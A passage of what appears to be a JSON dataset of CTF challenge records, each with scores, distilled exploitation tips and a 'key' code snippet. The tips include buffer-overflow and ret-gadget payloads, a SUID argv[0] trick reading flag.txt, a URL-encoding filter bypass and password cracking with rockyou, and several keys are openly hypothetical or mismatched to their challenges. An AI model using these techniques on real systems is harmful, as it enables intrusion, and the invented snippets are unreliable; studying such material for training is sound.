        "key": "```janet\n// init-rng -> returns random number generator  \nconstants = [  \n0: <cfunction os/time>  \n1: <cfunction math/rng>  \n2: @[nil] ]\n\n==================================\n\n(lds 0)             $0 = current closure  \n(ldc 2 0)           $2 = constants[0] // os/time  \n(call 1 2)          $1 = call $2 args  \n(push 1)            push args $1  \n(ldc 3 1)           $3 = constants[1] // math/rng  \n(call 2 3)          $2 = call $3 args  \n(ldc 1 2)           $1 = constans[2] // nil?  \n(puti 1 2 0)        $1[0] = $2  \n(ldc 1 2)           $2 = $1  \n(geti 1 1 0)        $1 = $1[0]  \n(ret 1)             ret $1 // returns generator\n```"
    },
    {
        "name": "getstat",
        "write_up": "dataset/raw/getstat.md",
        "type": "pwn",
        "competition": [
            "CyberSecurityRumble/2021",
            "https://ctftime.org/event/1429/tasks/"
        ],
        "score": 365,
        "max_score": 760,
        "difficulty": 0.48026315789473684,
        "knowledge": [
            "When working on challenges that involve buffer overflows with binaries that accept numeric input, consider the potential for stack smashing by providing input in an unexpected format or size. Specifically, entering a negative size for an array or data series, then providing enough data points can lead to a stack smashing condition that may be exploited to overwrite the return address and execute arbitrary code:\n   - To exploit such vulnerabilities, one must understand the memory layout, specifically the offset between the input pointer and the return address. This understanding can then be applied to carefully craft inputs that manipulate the stack to overwrite the return address with a desired payload or address.\n   - Example scenario: When the binary expects a series of numerical inputs to calculate statistics (like average and variance), and does not properly validate the size of the input series, leading to potential buffer overflow.",
            "In scenarios where direct execution of shellcode or jumping to a function requiring specific stack alignment (such as a `system(\"sh\")` call that expects a 16-byte stack alignment) through a buffer overflow exploit fails due to incorrect stack alignment, leverage a 'ret gadget' to adjust the stack before jumping to the target function:\n   - A 'ret gadget' is essentially an existing piece of code within the vulnerable binary, often a simple 'ret' instruction at a known address, which when jumped to, adjusts the stack by popping off values before transferring control to the intended function or shellcode.\n   - This method ensures proper stack alignment when exploiting buffer overflow vulnerabilities in binaries, specifically when the exploit requires jumping to a shell function or similar payloads where stack alignment is crucial for successful execution.\n   - Example payload for adjusting stack alignment before jumping to a shell function: jump to `ret` instruction address to fix stack alignment, then jump to shell function address.\n     ```\n     def iToF(i):\n         b = struct.pack('q', i)\n         return struct.unpack('d', b)[0]\n\n     ret = 0x4013e4  # Address of ret instruction for stack alignment\n     addr = 0x401360  # Address of shell function\n     \n     # Craft payload with adjusted stack alignment\n     payload = [iToF(ret), iToF(addr)]\n     ```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid get_input() {\n    int size;\n    printf(\"Bitte Gr\u00f6\u00dfe der Stichprobe eingeben: \");\n    scanf(\"%d\", &size);\n\n    double values[size];\n    for (int i = 0; i < size; i++) {\n        printf(\"Bitte Wert eingeben: \");\n        scanf(\"%lf\", &values[i]);\n    }\n\n    // Calculate average and variance (not shown)\n}\n\nint main() {\n    get_input();\n    return 0;\n}\n```"
    },
    {
        "name": "gg no re 50",
        "write_up": "dataset/raw/gg no re 50.md",
        "type": "web",
        "competition": [
            "AUCTF/2020",
            "https://ctftime.org/event/1020/tasks/"
        ],
        "score": -1,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When encountering obfuscated JavaScript code within a challenge, identifying and decoding embedded Base64 strings can reveal hidden paths or instructions essential for progression. Embedded strings should be decoded using online tools or programming functions to uncover these paths. For example, decoding a Base64 string might reveal an instruction such as \"Make a GET request to /hidden/nextstep.php\".",
            "Inspecting the network activity and response headers in the developer tools of a web browser can reveal additional clues or steps to follow in web-based challenges. This may include custom headers with encoded messages or instructions that need to be decoded or interpreted correctly. For instance, a response header `ROT13: Znxr n CBFG erdhrfg gb /ncv/svany.cuc` decoded from ROT13 reveals the next step: \"Make a POST request to /api/final.php\"."
        ],
        "key": "```js\nfunction validate(_0x3b3b3e){return\n_0x3b3b3e[_0x2ad1('0x1')]>=0x5&&_0x3b3b3e[_0x2ad1('0x0')]('$');}\n```"
    },
    {
        "name": "gipfel",
        "write_up": "dataset/raw/gipfel.md",
        "type": "crypto",
        "competition": [
            "HXP/2021",
            "https://ctftime.org/event/1447/tasks/"
        ],
        "score": 85,
        "max_score": 1000,
        "difficulty": 0.085,
        "knowledge": [
            "When engaging in cryptographic challenges where the goal is to influence or predict shared secrets in key exchange protocols, selecting specific inputs that exploit the mathematical properties of the underlying cryptographic operations can lead to predictable outcomes. Specifically, choosing a value such that \\(B = q - 1 \\equiv -1 \\mod q\\), when \\(q\\) is a prime number used in the modulus operation, forces any exponentiation involving \\(B\\) to result in a predictable outcome due to Fermat's Little Theorem. This method can be particularly effective in scenarios where the challenge involves manipulating shared secrets or session keys within Diffie-Hellman-like key exchange mechanisms.",
            "For challenges related to breaking encrypted communication where the encryption key is derived from a bruteforceable parameter (like a low-entropy password), iterating through the possible range of this parameter to derive potential keys, and then attempting decryption of a captured encrypted message can lead to the recovery of plaintext. This method is applicable in scenarios where the key derivation process is known, and the key space is sufficiently small to allow for practical enumeration. Utilizing efficient programming libraries for cryptographic operations and iterating with optimizations (e.g., avoiding recomputation of static values, using fast decryption routines) significantly enhances the feasibility of this attack vector. \n\nExample payload for the decryption loop:\n```py\nfrom Crypto.Hash import SHA256\nfrom Crypto.Cipher import AES\nfrom tqdm import tqdm\n\nflag_encrypted = \"8cc14560e62654903a42eb6b9d95d24ea7bb2a63a394cabfedbd61e2450b9555164fcf30c1f0f8ba\"\n\nfor password in tqdm(range(10 ** 6)):  \n   g = int(SHA256.new(str(password).encode()).hexdigest(), 16)\n   key = SHA256.new(b'\\0'.join([str(password).encode(), b'1'])).digest()\n   aes = AES.new(key, AES.MODE_CTR, nonce=b\"\")\n   try:\n       plaintext = aes.decrypt(bytes.fromhex(flag_encrypted))\n       if plaintext.startswith(b\"hxp{\"):\n           print(f\"Found password: {password}\")\n           print(f\"Plaintext: {plaintext.decode()}\")\n           break\n   except Exception as e:\n       continue\n```"
        ],
        "key": "```python\nq = 0x3a05ce0b044dade60c9a52fb6a3035fc9117b307ca21ae1b6577fef7acd651c1f1c9c06a644fd82955694af6cd4e88f540010f2e8fdf037c769135dbe29bf16a154b62e614bb441f318a82ccd1e493ffa565e5ffd5a708251a50d145f3159a5\n\ndef enc(a):  \n   f = {str: str.encode, int: int.__str__}.get(type(a))  \n   return enc(f(a)) if f else a\n\ndef H(*args):  \n   data = b'\\0'.join(map(enc, args))  \n   return SHA256.new(data).digest()\n\ndef F(h, x):  \n   return pow(h, x, q)\n\npassword = random.randrange(10**6)\n\ndef go():  \n   g = int(H(password).hex(), 16)\n\n   privA = 40*random.randrange(2**999)  \n   pubA = F(g, privA)  \n   print(f'{pubA = :#x}')\n\n   pubB = int(input(),0)  \n   if not 1 < pubB < q:  \n       exit('nope')\n\n   shared = F(pubB, privA)\n\n   verA = F(g, shared**3)  \n   print(f'{verA = :#x}')\n\n   verB = int(input(),0)  \n   if verB == F(g, shared**5):  \n       key = H(password, shared)  \n       flag = open('flag.txt').read().strip()  \n       aes = AES.new(key, AES.MODE_CTR, nonce=b'')  \n       print(f'flag:', aes.encrypt(flag.encode()).hex())  \n   else:  \n       print(f'nope! {shared:#x}')\n\ngo()  \ngo()  \ngo()  \n```"
    },
    {
        "name": "Glacier Military Daemon",
        "write_up": "dataset/raw/Glacier Military Daemon.md",
        "type": "This is a **pwn** challenge.",
        "competition": [
            "Glacier/2023",
            "https://ctftime.org/event/1992/tasks/"
        ],
        "score": 428,
        "max_score": 428,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with SUID binaries that use command-line arguments for execution control, modifying `argv[0]` through the use of the `-a` option with `exec` in bash can manipulate the executed binary's behavior. This technique allows for the execution of a different binary than originally intended, leveraging the SUID permission set to escalate privileges or execute arbitrary commands. Condition: This approach is effective in scenarios where the binary relies on its arguments (particularly `argv[0]`) for determining its behavior, and it is executing in an environment such as bash that supports the `-a` option with `exec`.\n   \n   Sample payload: `exec -a /bin/cat 0 '1/../self/root/flag.txt' &`",
            "Systems with resource limits can be exploited by intentionally triggering these limits to cause a program to fail and possibly retry an operation with modified parameters or behaviors. In this scenario, using `ulimit -n` to set a low file descriptor limit can force a program to fail when it attempts to open a new file descriptor, such as making a new network connection. This method is particularly useful in exploiting retry mechanisms in programs to initiate unintended behavior.\n\n   Sample payload: `ulimit -n 7; echo foo > /dev/tcp/127.0.0.1/80`"
        ],
        "key": "```c\n#include <stdlib.h>\n#include <unistd.h>\n\nint main(int argc, char *argv[]) {\n    if (argc != 3) {\n        return 1;\n    }\n\n    long current_restart = strtol(argv[1], NULL, 10);\n    long max_restarts = strtol(argv[2], NULL, 10);\n\n    if (current_restart >= max_restarts) {\n        return 1;\n    }\n\n    // Simulate an error to trigger a restart\n    execv(argv[0], argv);\n    return 0;\n}\n```"
    },
    {
        "name": "GlacierVault",
        "write_up": "dataset/raw/GlacierVault.md",
        "type": "This write-up describes a **pwn** challenge. \n\nExplanation:\n- The write-up mentions the existence of two Solidity contracts, a proxy contract, and an implementation contract. \n- It then describes a weakness in the proxy contract that allows for write access to the same storage slot used to determine the owner of the proxy contract.\n- The provided exploit code shows manipulation of the storage slot to change the owner of the proxy contract and put the contract to sleep.\n\nTherefore, based on the information provided, this challenge falls under the **pwn** category.",
        "competition": [
            "Glacier/2023",
            "https://ctftime.org/event/1992/tasks/"
        ],
        "score": -1,
        "max_score": 428,
        "difficulty": -1,
        "knowledge": [
            "In solidity smart contracts, when a proxy contract and an implementation contract share the same storage layout, it is crucial to manage the storage carefully to prevent unauthorized access or write operations. The exploit demonstrates that if both contracts share a storage slot and that storage slot corresponds to sensitive information (like ownership details), it can be manipulated by interacting with the implementation contract in a way that wasn't intended by the original proxy contract's logic. One can exploit this by writing to the shared storage slot directly through the implementation contract, effectively altering the state in the proxy contract without direct interaction.",
            "The exploit also shows the importance of understanding the delegation of calls in proxy patterns within solidity contracts. If the proxy delegates calls to an implementation contract, and that implementation contract contains functions that can alter important state variables due to shared storage slots, these functions can be abused to change the state in ways unintended by the developers. This is particularly critical if the implementation contract has functions that do not properly check the caller's permissions, as demonstrated where an unauthorized address could change the owner by directly writing to the storage slot through the implementation contract's function."
        ],
        "key": "```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Proxy {\n    address public owner;\n    address public implementation;\n\n    function setImplementation(address _impl) public {\n        require(msg.sender == owner, \"Not authorized\");\n        implementation = _impl;\n    }\n\n    fallback() external payable {\n        address impl = implementation;\n        require(impl != address(0), \"Implementation not set\");\n        assembly {\n            let ptr := mload(0x40)\n            calldatacopy(ptr, 0, calldatasize())\n            let result := delegatecall(gas(), impl, ptr, calldatasize(), 0, 0)\n            let size := returndatasize()\n            returndatacopy(ptr, 0, size)\n            switch result\n            case 0 { revert(ptr, size) }\n            default { return(ptr, size) }\n        }\n    }\n}\n\ncontract Implementation {\n    address public owner;\n    bool public asleep;\n\n    function quickStore(uint256 slot, uint256 value) public payable {\n        require(msg.value > 0, \"No value sent\");\n        assembly {\n            sstore(slot, value)\n        }\n    }\n\n    function putToSleep() public {\n        require(msg.sender == owner, \"Not authorized\");\n        asleep = true;\n    }\n}\n```"
    },
    {
        "name": "Golden Antelope",
        "write_up": "dataset/raw/Golden Antelope.md",
        "type": "crypto",
        "competition": [
            "VolgaCTF/2018/Quals",
            "https://ctftime.org/event/539/tasks/"
        ],
        "score": 350,
        "max_score": 500,
        "difficulty": 0.7,
        "knowledge": [
            "In challenges involving predicting pseudo-random number generator (PRNG) sequences, if the server provides partial outputs from the PRNG, you can reconstruct the PRNG state by reversing the operations or inferring the state transitions. This is especially feasible if you know the algorithm and can observe the output's transformation or the state's evolution over time. For instance, knowing how the last number is derived as a function of the internal state (e.g., using the last 8 bits of state, reversed, and converted to an integer) can help in back-calculating to estimate the state of the generator at a previous step.",
            "In cryptography challenges that involve modular arithmetic and sequences generated by operations on bit sequences, such as left shifts and bitwise AND operations with known patterns, you can use a brute-force approach combined with filtering based on provided outputs to narrow down possible initial states or key material. This entails enumerating possible values that satisfy given conditions (for example, initial outputs or a specific transformation result) and iteratively applying constraints or additional information (like subsequent output values) to refine guesses toward the accurate solution. This method can progressively eliminate incorrect states or keys, converging on the correct ones by validating against a known sequence of outputs."
        ],
        "key": "```python\ndef H(state):  \n   return int(\"\".join(map(str, state[-1:-9:-1])), 2)  \n\ndef generate_number(last_number):\n    return ((last_number & 0b01111111) << 1) + (last_number & 0b10000000) >> 7\n```"
    },
    {
        "name": "Good Driver Bad Driver",
        "write_up": "dataset/raw/Good Driver Bad Driver.md",
        "type": "web",
        "competition": [
            "vishwa/2021",
            "https://ctftime.org/event/1286/tasks/"
        ],
        "score": 496,
        "max_score": 500,
        "difficulty": 0.992,
        "knowledge": [
            "When faced with a classification task in a Capture The Flag challenge that involves predicting categories based on provided datasets, machine learning techniques, specifically supervised learning models, can be effectively applied. Ensuring the model is adequately trained on the provided labeled dataset before applying it to classify or predict the unlabeled data can achieve high accuracy. For example, one could use Python along with libraries such as scikit-learn to train a model (e.g., Random Forest, Support Vector Machine, or any suitable classifier) using the labeled dataset (`drivertrainlabeled.csv`) and then predict the classes of the new data (`drivertestunlabeled.csv`).",
            "In challenges requiring a perfect prediction accuracy to retrieve the flag (`accuracy of 1.0` as mentioned), it is critical to perform thorough data preprocessing and feature engineering before training the model. This could involve handling missing data, normalizing or standardizing the features, and possibly reducing dimensionality if the dataset is high-dimensional. These steps enhance the model's ability to learn from the training data and make accurate predictions on the test data. After preprocessing, applying techniques like cross-validation to tune model parameters and select the best model is essential for achieving the required prediction accuracy."
        ],
        "key": "```python\nimport pandas as pd\n\n# Load the labeled data\nlabeled_data = pd.read_csv('drivertrainlabeled.csv')\n\n# Example of a possible vulnerable code snippet\ndef classify_driver(score):\n    if score < 50:\n        return 2  # Bad\n    elif score < 75:\n        return 1  # Average\n    else:\n        return 0  # Good\n\n# Apply the classification to the test data\ntest_data = pd.read_csv('drivertestunlabeled.csv')\ntest_data['classification'] = test_data['score'].apply(classify_driver)\n\n# Save the results\ntest_data.to_csv('classified_drivers.csv', index=False)\n```\n"
    },
    {
        "name": "Good luks2",
        "write_up": "dataset/raw/Good luks2.md",
        "type": "This CTF challenge is classified as a crypto challenge.",
        "competition": [
            "BSidesSF/2019",
            "https://ctftime.org/event/753/tasks/"
        ],
        "score": 100,
        "max_score": 666,
        "difficulty": 0.15015015015015015,
        "knowledge": [
            "When faced with encrypted disk challenges, specifically LUKS (Linux Unified Key Setup) encrypted volumes, it's pivotal to dump the header containing the password hash for the encrypted volume. This can be accomplished using the `dd` command. The specific usage involves specifying the input file (the encrypted volume), the output file (where the header will be saved), and the byte size to ensure only the header is extracted. This process is essential for the subsequent password cracking stage.",
            "For brute-forcing the password of an encrypted volume, leveraging common password dictionaries such as `rockyou.txt` can be highly effective. Prioritize well-known and comprehensive dictionaries, which are often used in password attacks due to their extensive collection of passwords from various data breaches. If the challenge hints suggest a focus on vocabulary, initially exploring niche or themed wordlists can be considered, but broadening the scope to include extensive lists like `rockyou.txt` should not be delayed, as it often contains the keys to rapidly unlocking such puzzles. \n\n    Example command using hashcat with rockyou.txt:\n    ```\n    hashcat -a 0 -m [mode] [hashfile] /path/to/rockyou.txt\n    ```"
        ],
        "key": "```python\nimport os\n\ndef check_password(password):\n    stored_password_hash = \"5f4dcc3b5aa765d61d8327deb882cf99\"  # Example hash for \"password\"\n    return hash_password(password) == stored_password_hash\n\ndef hash_password(password):\n    # Vulnerable hashing function (e.g., MD5)\n    import hashlib\n    return hashlib.md5(password.encode()).hexdigest()\n\ndef authenticate():\n    password = input(\"Enter password: \")\n    if check_password(password):\n        print(\"Access granted\")\n    else:\n        print(\"Access denied\")\n\nif __name__ == \"__main__\":\n    authenticate()\n```\n"
    },
    {
        "name": "goodluks1",
        "write_up": "dataset/raw/goodluks1.md",
        "type": "The type of this CTF challenge is \"forensics\".",
        "competition": [
            "BSidesSF/2019",
            "https://ctftime.org/event/753/tasks/"
        ],
        "score": 50,
        "max_score": 666,
        "difficulty": 0.07507507507507508,
        "knowledge": [
            "When dealing with an encrypted LUKS partition in a CTF challenge, one potential method to derive the decryption passphrase is by analyzing auxiliary information or hints provided along with the challenge. This could include seemingly unrelated files or images that, upon closer examination, contain clues or direct references to password generation schemes or the passwords themselves. In scenarios where a password is hinted to be generated through a specific method or derived from a set of given information (such as numeric codes, phrases, or memberships tied to public resources like the EFF's [Electronic Frontier Foundation] dice-rolled passwords), converting said information according to the hinted scheme may lead to the correct passphrase.\n    - No example payload, as the process involves interpretation and conversion based on the hints provided.",
            "If an image or additional file hints at an association with external resources like websites or organizations (EFF in this scenario), it can be instrumental to visit these external resources for potential password generation methods or tools. Websites associated with cybersecurity and privacy often have tools for generating strong passwords or phrases that could be used as encryption keys. Analyzing the hints to connect them to such tools and applying the derived information (like converting given numeric codes into words through the EFF's password generation page) could reveal the decryption key.\n    - No example payload, as this involves navigating to external websites and utilizing tools or information found therein to derive the necessary key."
        ],
        "key": "```python\ndef decrypt_luks_partition(image_path, password):\n    import subprocess\n\n    try:\n        # Attempt to open the LUKS encrypted partition\n        subprocess.run(['sudo', 'cryptsetup', 'luksOpen', image_path, 'luks'], check=True)\n    except subprocess.CalledProcessError as e:\n        print(f\"Failed to open LUKS partition: {e}\")\n```\n"
    },
    {
        "name": "GoSynthesizeTheFlagYourself",
        "write_up": "dataset/raw/GoSynthesizeTheFlagYourself.md",
        "type": "reverse",
        "competition": [
            "justCTF/2019",
            "https://ctftime.org/event/943/tasks/"
        ],
        "score": 453,
        "max_score": 500,
        "difficulty": 0.906,
        "knowledge": [
            "When analyzing Linux binaries with angr for reverse engineering challenges, incorporating specific constraints to model the expected input size can significantly increase efficiency. This involves making the length of the input symbolic and setting the simulation to search pathways leading to specific output (e.g., success messages). This technique is effective when the binary requires input that meets certain length and content requirements.\n   - Example Python code snippet using angr:\n     ```python\n     import angr\n     import claripy\n\n     p = angr.Project(\"binary_name\")\n     symsize = claripy.BVS('inputLength', 64) # Adjust 64 to required input size\n     simfile = angr.SimFile('/tmp/stdin', size=symsize)\n     state = p.factory.entry_state(stdin=simfile)\n     simgr = p.factory.simulation_manager(state)\n     simgr.explore(find=lambda s: b\"Success Message\" in s.posix.dumps(1))\n     ```",
            "For solving challenges involving the reconstruction of input based on state transitions defined in SystemVerilog files, extracting and mapping state transitions can reveal the input sequence leading to the final state. This requires parsing the SystemVerilog code to build a map of state transitions and corresponding input values (`di`), then traversing this map from the initial state to the final, solution state to assemble the flag.\n   - Example Python code snippet for state transition mapping and traversal:\n     ```python\n     entries = {}  # A dictionary to hold state transitions\n     # Populate 'entries' with state transitions and corresponding di values\n     # lines = ['...']  # SystemVerilog file lines\n\n     state = initial_state  # The starting state\n     flag = []  # To accumulate the flag characters\n     while state != final_state:  # Traverse until solution state is reached\n         state, flag_part = entries[state]  # Get next state and flag part\n         flag.append(flag_part)  # Append flag part to the flag\n     ```"
        ],
        "key": "```c\n// Hypothetical vulnerable code snippet based on the context of a custom VM checking a password\n#include <stdio.h>\n#include <string.h>\n\nint check_password(const char *input) {\n    char password[41] = \"correct_password\"; // Assume this is the correct password\n    char buffer[41];\n    \n    // Vulnerable to buffer overflow if input is longer than 40 characters\n    strcpy(buffer, input);\n    \n    // Simulate some VM calculations\n    for (int i = 0; i < strlen(buffer); i++) {\n        buffer[i] ^= 0x5A; // Simple XOR operation\n    }\n    \n    // Check if the transformed input matches the password\n    if (strcmp(buffer, password) == 0) {\n        printf(\"Good password. Congratulations!\\n\");\n        return 1;\n    } else {\n        printf(\"Bad password. Try again.\\n\");\n        return 0;\n    }\n}\n\nint main() {\n    char input[100];\n    printf(\"Please provide your credentials!\\n\");\n    fgets(input, sizeof(input), stdin);\n    input[strcspn(input, \"\\n\")] = 0; // Remove newline character\n    check_password(input);\n    return 0;\n}\n```"
    },
    {
        "name": "gpushop",
        "write_up": "dataset/raw/gpushop.md",
        "type": "web",
        "competition": [
            "GoogleCTF/2021",
            "https://ctftime.org/event/1318/tasks/"
        ],
        "score": 283,
        "max_score": 233123.2321,
        "difficulty": 0.0012139502247403853,
        "knowledge": [
            "When faced with a web application utilizing path-based request handling mechanisms, if traditional path manipulation or case sensitivity exploitation methods fail (e.g., changing case of letters in the path), consider the use of URL encoding to bypass restrictions or filters. This approach can be essential in exploiting server-side request handling to access restricted endpoints or trigger unintended server behaviors. Example payload: Encoding the path `/checkout` as `/cart/%63%68%65%63%6b%6f%75%74` to bypass restrictions.",
            "In scenarios where a web application adds specific headers based on request paths (such as the \"X-Wallet\" header when accessing a checkout functionality), modifying the request path through URL encoding can prevent the application from appending these headers. This technique can be particularly useful in situations where the presence of certain headers might block access to vulnerable functionalities or endpoint behaviors essential for completing a challenge."
        ],
        "key": "```php\n<?php\n\n// Assuming this is part of the Laravel controller handling the checkout process\n\npublic function checkout(Request $request)\n{\n    // Retrieve the X-Wallet header\n    $walletHeader = $request->header('X-Wallet');\n\n    // Check if the header is present\n    if (!$walletHeader) {\n        return response()->json(['error' => 'Payment address is required'], 400);\n    }\n\n    // Process the checkout with the payment address\n    $paymentAddress = $walletHeader;\n\n    // ... rest of the checkout logic\n}\n\n?>\n```\n"
    },
    {
        "name": "Greatest Hits 3 of 4",
        "write_up": "dataset/raw/Greatest Hits 3 of 4.md",
        "type": "The type of the CTF challenge described in the write-up is crypto.",
        "competition": [
            "BlueHens/2023",
            "https://ctftime.org/event/2126/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "When faced with an XOR encryption challenge where the key is unknown but part of the plaintext is known, the known plaintext attack can be applied. This attack involves brute-forcing every possible offset where the known plaintext might fit within the ciphertext. For each offset, XOR the slice of ciphertext corresponding to the length of known plaintext with the known plaintext itself. This might produce a permutation of the original encryption key, requiring adjustment based on the offset. The correct permutation of the key can then be used to decrypt the entire message. Example conceptual payload snippet: \n```python\nfor offset in range(len(ciphertext) - len(known_plaintext)):  \n    key_fragment = xor(ciphertext[offset:offset+len(known_plaintext)], known_plaintext)\n    potential_key = rearrange_key_based_on_offset(key_fragment, offset)\n    if is_ascii(xor(ciphertext, potential_key)):\n        print(xor(ciphertext, potential_key))\n```",
            "In XOR encryption challenges, determining whether a decrypted message is correct might require checking if it consists of printable ASCII characters. This can be accomplished by implementing a function that verifies all characters in the decrypted message are within the ASCII printable range. This method effectively filters out false positives, leading to the identification of the correct plaintext. Example function snippet in Python for checking ASCII printability:\n```python\ndef is_ascii(s):\n    return all(c in string.printable for c in s)\n```"
        ],
        "key": "```python\ndef xor(msg, key):  \n   o = ''  \n   for i in range(len(msg)):  \n       o += chr(ord(msg[i]) ^ ord(key[i % len(key)]))  \n   return o\n\nimport os  \nkey = os.urandom(len(clue))  \nassert(flaglink.count(clue) > 0)\n\nprint(xor(flaglink, key).encode('hex'))  \n```"
    },
    {
        "name": "Greatest Hits 4 of 4",
        "write_up": "dataset/raw/Greatest Hits 4 of 4.md",
        "type": "This write-up belongs to the crypto category.",
        "competition": [
            "BlueHens/2023",
            "https://ctftime.org/event/2126/tasks/"
        ],
        "score": 429,
        "max_score": 500,
        "difficulty": 0.858,
        "knowledge": [
            "When dealing with cryptography challenges involving time-seeded pseudorandom number generators (PRNGs), if the seed is based on a known or predictable value such as the current time, one can brute-force the seed values by iterating through a range of time values around the seed's initialization time. This approach is applicable when the seed is initialized with time and the exact time or a narrow time range is known. This method relies on recreating the PRNG state by seeding it with each assumed value in the sequence and attempting decryption until the output meets a certain condition, such as producing readable ASCII characters.",
            "The compatibility of Python versions can significantly impact the execution and output of scripts, particularly with functions and methods that have changed across versions. If a script uses Python 2 specific methods, such as `.encode('hex')`, it may not run as expected in Python 3 which does not support these methods. In such scenarios, ensuring that the script is run with the appropriate Python version is crucial for achieving the expected outcomes. This is especially relevant when working with encoding and decoding data, where Python 3 introduces explicit differences between bytes and string objects, unlike Python 2."
        ],
        "key": "```python\nflag=\"REDACTED\"  \nimport random  \nimport time  \nprint(time.time())  \n#1697043249.53  \ntime.sleep(random.randint(0, 50))  \nrandom.seed(int(time.time()))  \nct=\"\"  \nfor c in flag:  \n   ct += chr(random.randint(0,255) ^ ord(c))  \nprint(ct.encode('hex'))  \n#a0469bbb0b3a4f06306739032244b0c5119ba66a0d3b5a2322acdd7070bf85690cdf8573212c1b927e0ba624  \n```"
    },
    {
        "name": "Green Cabbage",
        "write_up": "dataset/raw/Green Cabbage.md",
        "type": "This is a forensics challenge.",
        "competition": [
            "ASIS/2018/Finals",
            "https://ctftime.org/event/620/tasks/"
        ],
        "score": 322,
        "max_score": 500,
        "difficulty": 0.644,
        "knowledge": [
            "When analyzing network capture files (pcap), if the scenario involves communication with a server that includes seemingly binary or base64 encoded payloads, consider decoding the payloads with common encoding schemes or compression algorithms. Particularly, if the communication data resembling compressed data or encoded strings results in a recognizable pattern or structure upon decompression, it may indicate the use of a specific compression algorithm like Brotli. This approach can reveal hidden messages or commands being transmitted. For instance, encountering a large blob of data that decompresses to a structured format or text might hint towards its encoding with a compression tool.",
            "In challenges where the interaction with a server requires sending back responses or specific formats of data (like timestamps, compressed strings, etc.), if straightforward tasks do not yield results, consider reflecting back the data received from the server with minimal modifications as required by the server's prompts. This could involve sending back the same data in a different format (for example, epoch time format) or compressing/decompressing data using indicated algorithms. This technique can be especially useful when the task or the expected response format is unclear but guided by server-side messages.\n\nExample command for decompression with Brotli (assuming the payload is base64 encoded and compressed with Brotli):\n```bash\necho 'Base64EncodedString==' | base64 --decode | brotli --decompress\n```"
        ],
        "key": "```python\nimport socket\nimport time\n\ndef communicate_with_server():\n    server_address = ('37.139.4.247', 31337)\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(server_address)\n\n    try:\n        # Initial communication\n        data = sock.recv(1024)\n        print(data.decode())\n\n        # Send the current epoch time\n        current_time = str(int(time.time()))\n        sock.sendall(current_time.encode())\n\n        # Receive the Brotli logo\n        data = sock.recv(1024)\n        print(data.decode())\n\n        # Respond to the server's question\n        sock.sendall(b'Y')\n\n        # Receive the compressed string\n        data = sock.recv(1024)\n        print(data.decode())\n\n        # Send back the received string\n        sock.sendall(data)\n\n        # Receive the flag\n        data = sock.recv(1024)\n        print(data.decode())\n\n    finally:\n        sock.close()\n\ncommunicate_with_server()\n```"
    },
    {
        "name": "Greeter",
        "write_up": "dataset/raw/Greeter.md",
        "type": "pwn",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 150,
        "max_score": 800,
        "difficulty": 0.1875,
        "knowledge": [
            "When exploiting a buffer overflow vulnerability in a program where the 'gets' function is used, causing a lack of bounds checking, calculate the exact number of bytes to the buffer plus any additional bytes needed to overwrite the base pointer (bp) to control the stack pointer (rsp). This allows the injection of an address pointing to a malicious function (e.g., a win function) to hijack the program's execution flow. In this scenario, it was necessary to overflow 64 bytes of buffer plus 8 bytes (the base pointer) to effectively control the rsp. Therefore, supplying 72 arbitrary bytes (\"A\"*72) followed by the target address can redirect the execution.\n   - Example payload to call the 'win' function: \"A\"*72 + p64(address_of_win_function)",
            "When dealing with programs compiled with NX (Non-Executable Stack) enabled, which prevents execution of arbitrary code on the stack, but PIE (Position Independent Executable) is disabled, allowing for predictable memory addresses, it is viable to use the address of a function within the binary to cause a controlled execution flow change. To find the memory address of the intended function (e.g., a function that prints out a flag), debugging tools such as GDB can be used with commands like `info functions function_name`. This address can then be injected into the exploit payload crafted to overflow the buffer.\n   - For obtaining the address of a function like 'win' in GDB: `info functions win`"
        ],
        "key": "```c\n#include <stdio.h>  \n#include <stdlib.h>\n\nvoid win() {  \n\tputs(\"congrats! here's your flag:\");  \n\tchar flagbuf[64];  \n\tFILE* f = fopen(\"./flag.txt\", \"r\");  \n\tif (f == NULL) {  \n\t\tputs(\"flag file not found!\");  \n\t\texit(1);  \n\t}  \n\tfgets(flagbuf, 64, f);  \n\tfputs(flagbuf, stdout);  \n\tfclose(f);  \n}\n\nint main() {  \n\t/* disable stream buffering */  \n\tsetvbuf(stdin,  NULL, _IONBF, 0);  \n\tsetvbuf(stdout, NULL, _IONBF, 0);  \n\tsetvbuf(stderr, NULL, _IONBF, 0);\n\n\tchar name[64];\n\n\tputs(\"What's your name?\");  \n\tgets(name);  \n\tprintf(\"Why hello there %s!\\n\", name);\n\n\treturn 0;  \n}  \n```"
    },
    {
        "name": "Grep 0",
        "write_up": "dataset/raw/Grep 0.md",
        "type": "The type of this CTF challenge is **misc** (miscellaneous).",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 50,
        "max_score": 800,
        "difficulty": 0.0625,
        "knowledge": [
            "When dealing with large text files in CTF challenges that hint at the presence of a hidden pattern or keyword, `grep` can be effectively used to search through the text by leveraging patterns, regular expressions, or even partial keywords to locate the flag. This approach is particularly useful when the exact terms or phrases to search for are not known, but a general idea or hint is provided. Example usage: `grep \"pattern\" filename.txt`, where \"pattern\" could be a broad or partial match hinted by the challenge description.",
            "If initial attempts to locate a flag using specific or complete keywords are unsuccessful, truncating the search pattern to a smaller subset of the suspected keyword may yield results. This method plays on the probability that even parts of the correct keyword can be present in the hidden flag or the relevant text leading to the flag. This strategy requires iterative refinement of the search pattern based on the challenge hints or logical deductions from the challenge context. Example usage: `grep \"pa\" filename.txt`, where \"pa\" is a truncated version of the suspected keyword or pattern."
        ],
        "key": "```python\ndef search_flag(file_path):\n    with open(file_path, 'r') as file:\n        for line in file:\n            if \"flag{\" in line:\n                return line.strip()\n    return \"Flag not found\"\n\n# Example usage\nflag = search_flag('flag.txt')\nprint(flag)\n```"
    },
    {
        "name": "Grep 1",
        "write_up": "dataset/raw/Grep 1.md",
        "type": "The type of the challenge is **forensics**.",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
